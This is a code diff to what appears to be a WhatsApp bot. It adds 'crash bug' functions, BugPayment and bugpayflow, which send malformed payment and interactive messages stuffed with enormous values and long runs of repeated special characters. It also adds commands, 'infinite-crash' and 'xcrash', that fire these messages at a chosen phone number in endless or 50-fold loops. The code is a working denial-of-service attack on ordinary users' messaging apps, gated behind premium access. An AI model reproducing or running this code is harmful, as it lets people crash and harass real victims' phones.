@@ -885,13 +885,160 @@ async function ios1(jid) {
 			});
 		};
 
+
+async function BugPayment(jid){
+await XeonBotInc.relayMessage(jid, { viewOnceMessage: { message: { messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {}}, interactiveMessage: {
+nativeFlowMessage: {
+buttons: [
+{
+name: 'payment_info',
+buttonParamsJson: '{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
+},
+],
+}}}}}, { participant: { jid: jid } }, { messageId: null })}
+
+
+async function bugpayflow(userJidx) {
+            for (let i = 0; i < 20; i++) {
+              const qpaybutton = {
+                name: "payment_info",
+                buttonParamsJson: JSON.stringify({
+                  currency: "MYR",
+                  total_amount: {
+                  value: 999999999999,
+                  offset: 999999999999
+                  },
+                  reference_id: "X0D3SK9ZD3V",
+                  type: "physical-goods",
+                  order: {
+                    status: 'pending',
+                    subtotal: {
+                    value: 999999999999,
+                    offset: 999999999999
+                    },
+                    order_type: 'ORDER',
+                    items: [{
+                      name: "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱.𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦",
+                      amount: {
+                      value: 999999999999,
+                      offset: 999999999999
+                      },
+                      quantity: 999999999999,
+                      sale_amount: {
+                      value: 999999999999,
+                      offset: 999999999999
+                      },
+                    }]
+                  },
+                  payment_settings: [{
+                    type: "pix_static_code",
+                    pix_static_code: {
+                      merchant_name: "XBUG5",
+                      key: "WDX",
+                      key_type: 'Q'
+                    }
+                  }]
+                })
+              };
+              const nativeFlowMessage = {
+                buttons: [qpaybutton]
+              };
+              const interactiveMessage = {
+                nativeFlowMessage: nativeFlowMessage
+              };
+              const message = {
+                messageContextInfo: {
+                deviceListMetadataVersion: 2,
+                deviceListMetadata: {}
+                },
+                interactiveMessage: interactiveMessage
+              };
+              const viewOnceMessage = {
+                message: message
+              };
+              const vrdrk = {
+                viewOnceMessage: viewOnceMessage
+              };
+              await sam.relayMessage(userJidx, vrdrk, {
+                participant: {
+                  jid: userJidx
+                }
+              });
+            }
+            for (let j = 0; j < 3; j++) {
+              const header = {
+                title: '',
+                subtitle: " "
+              };
+              const body = {
+                text: "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱.𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦"
+              };
+              const footer = {
+                'text': "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱ ؂؃؂؃.؂؃؂؃.؂؃؂؃"
+              };
+              const displaybuttons = {
+                name: "cta_url",
+                buttonParamsJson : JSON.stringify({
+                  display_text: "XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱",
+                  url: '',
+                  merchant_url: ''
+                })
+              };
+              const vrdrknew = {
+                viewOnceMessage: {
+                  message: {
+                    interactiveMessage: {
+                      header: header,
+                      body: body,
+                      footer: footer,
+                      nativeFlowMessage: {
+                        buttons: [displaybuttons],
+                        messageParamsJson: ".𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦".repeat(100000)
+                      }}}}};
+              await XeonBotInc.relayMessage(userJidx, vrdrknew, { participant: { jid: userJidx
+                }})}}
+
+	    
         switch (command) {
+case 'infinite-crash': {
+if (!isPremium) return replygcxeon(mess.prem)
+if (!q) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
+let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
+await loading()
+for (;;) {
+await BugPayment(target)
+await bugpayflow(target)
+await beta(betaq, target)
+}
+replygcxeon(`Successfully Sent Bug To ${target}`)
+}
+break 
+
+			
+case 'xcrash': {
+if (!isPremium) return replygcxeon(mess.prem)
+if (!q) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
+let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
+await loading()
+for (let i = 0; i < 50; i++) {
+await BugPayment(target)
+await bugpayflow(target)
+await beta(betaq, target)
+}
+replygcxeon(`Successfully Sent Bug To ${target}`)
+}
+break
+
+
+
 case 'infinite': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!q) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
 let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (;;) {
+await BugPayment(target)
+await bugpayflow(target)
 await PayMent(target)
 await beta(betaq, target)
 await caros(target, Ptcp = true)
@@ -912,6 +1059,8 @@ if (!q) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix
 let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (let i = 0; i < 50; i++) {
+await BugPayment(target)
+await bugpayflow(target)
 await PayMent(target)
 await beta(betaq, target)
 await caros(target, Ptcp = true)
@@ -2706,28 +2855,6 @@ await sleep(3000)
 replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
 }
 break
-case 'xcrash':{
-if (!isPremium) return replygcxeon(mess.prem)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
- victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "100"
-for (let i = 0; i < amount; i++) {
-XeonyCrashy(pushname,victim)
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-}
-break
-case 'xcrash2':
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
- amount = `${encodeURI(text)}`
-for (let i = 0; i < amount; i++) {
-XeonyCrashy(pushname,m.chat)
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
-break
 case 'amountbug': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
@@ -3083,7 +3210,9 @@ xkill2 <amount>
 xkillgc <link group>
 tempban <code|number>
 xcrash <number>
-xcrash2 <amount>
+infinite <number> 
+infinite-crash <number>
+ioscrash <number>
 xioscrash <number>
 xioscrash2 <amount>
 iosgoogle <number>
@@ -3271,7 +3400,7 @@ if (typemenu === 'v1') {
                 }
         }
     } catch (err) {
-        XeonBotInc.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
+       // XeonBotInc.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
         console.log(util.format(err))
     }
 }
